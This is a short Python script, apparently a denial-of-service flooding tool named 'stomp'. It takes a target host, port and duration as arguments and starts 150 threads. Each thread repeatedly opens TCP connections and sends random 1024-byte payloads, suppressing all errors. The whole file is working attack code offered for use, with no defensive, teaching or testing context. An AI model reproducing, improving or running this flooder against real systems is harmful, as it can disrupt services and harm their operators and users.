import socket, sys, threading, random, time
def stomp():
    target, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(random._urandom(1024))
        except: pass
for _ in range(150): threading.Thread(target=stomp).start()

